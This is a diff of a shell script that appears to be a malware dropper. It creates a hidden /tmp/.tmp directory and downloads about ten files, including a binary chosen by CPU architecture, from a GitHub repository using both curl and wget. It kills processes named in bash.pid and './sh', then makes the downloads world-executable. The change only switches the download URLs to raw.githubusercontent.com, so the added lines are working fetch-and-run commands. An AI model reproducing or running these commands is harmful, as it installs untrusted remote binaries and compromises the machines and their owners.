@@ -231,29 +231,29 @@ id8="run"
 id9="java"
 id10="upd"
 mkdir  /tmp/.tmp
-curl -o /tmp/.tmp/`echo $id1` https://github.com/balabalavip/ss/raw/master/ss/`echo $id1`
-wget -O /tmp/.tmp/`echo $id1` https://github.com/balabalavip/ss/raw/master/ss/`echo $id1`
-curl -o /tmp/.tmp/`echo $id2` https://github.com/balabalavip/ss/raw/master/ss/`echo $id2`
-wget -O /tmp/.tmp/`echo $id2` https://github.com/balabalavip/ss/raw/master/ss/`echo $id2`
-curl -o /tmp/.tmp/`echo $id3` https://github.com/balabalavip/ss/raw/master/ss/`echo $id3`
-wget -O /tmp/.tmp/`echo $id3` https://github.com/balabalavip/ss/raw/master/ss/`echo $id3`
-curl -o /tmp/.tmp/`echo $id4` https://github.com/balabalavip/ss/raw/master/ss/`echo $id4`
-wget -O /tmp/.tmp/`echo $id4` https://github.com/balabalavip/ss/raw/master/ss/`echo $id4`
-curl -o /tmp/.tmp/`echo $id5` https://github.com/balabalavip/ss/raw/master/ss/`echo $id5`
-wget -O /tmp/.tmp/`echo $id5` https://github.com/balabalavip/ss/raw/master/ss/`echo $id5`
-curl -o /tmp/.tmp/`echo $id6` https://github.com/balabalavip/ss/raw/master/ss/`echo $id6`
-wget -O /tmp/.tmp/`echo $id6` https://github.com/balabalavip/ss/raw/master/ss/`echo $id6`
-curl -o /tmp/.tmp/`echo $id7` https://github.com/balabalavip/ss/raw/master/ss/`echo $id7`
-wget -O /tmp/.tmp/`echo $id7` https://github.com/balabalavip/ss/raw/master/ss/`echo $id7`
-curl -o /tmp/.tmp/`echo $id8` https://github.com/balabalavip/ss/raw/master/ss/`echo $id8`
-wget -O /tmp/.tmp/`echo $id8` https://github.com/balabalavip/ss/raw/master/ss/`echo $id8`
+curl -o /tmp/.tmp/`echo $id1` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id1`
+wget -O /tmp/.tmp/`echo $id1` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id1`
+curl -o /tmp/.tmp/`echo $id2` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id2`
+wget -O /tmp/.tmp/`echo $id2` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id2`
+curl -o /tmp/.tmp/`echo $id3` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id3`
+wget -O /tmp/.tmp/`echo $id3` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id3`
+curl -o /tmp/.tmp/`echo $id4` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id4`
+wget -O /tmp/.tmp/`echo $id4` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id4`
+curl -o /tmp/.tmp/`echo $id5` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id5`
+wget -O /tmp/.tmp/`echo $id5` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id5`
+curl -o /tmp/.tmp/`echo $id6` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id6`
+wget -O /tmp/.tmp/`echo $id6` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id6`
+curl -o /tmp/.tmp/`echo $id7` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id7`
+wget -O /tmp/.tmp/`echo $id7` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id7`
+curl -o /tmp/.tmp/`echo $id8` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id8`
+wget -O /tmp/.tmp/`echo $id8` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id8`
 cd /tmp/.tmp
 cat bash.pid |xargs kill
 pkill  ./sh
-curl -o /tmp/.tmp/`echo $id9` https://github.com/balabalavip/ss/raw/master/ss/$(uname -m)
-wget -O /tmp/.tmp/`echo $id9` https://github.com/balabalavip/ss/raw/master/ss/$(uname -m)
-curl -o /tmp/.tmp/`echo $id10` https://github.com/balabalavip/ss/raw/master/ss/`echo $id10`
-wget -O /tmp/.tmp/`echo $id10` https://github.com/balabalavip/ss/raw/master/ss/`echo $id10`
+curl -o /tmp/.tmp/`echo $id9` https://raw.githubusercontent.com/balabalavip/ss/master/ss/$(uname -m)
+wget -O /tmp/.tmp/`echo $id9` https://raw.githubusercontent.com/balabalavip/ss/master/ss/$(uname -m)
+curl -o /tmp/.tmp/`echo $id10` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id10`
+wget -O /tmp/.tmp/`echo $id10` https://raw.githubusercontent.com/balabalavip/ss/master/ss/`echo $id10`
 cd /tmp/.tmp
 chmod 777 /tmp/.tmp/`echo $id1`
 chmod 777 /tmp/.tmp/`echo $id2`
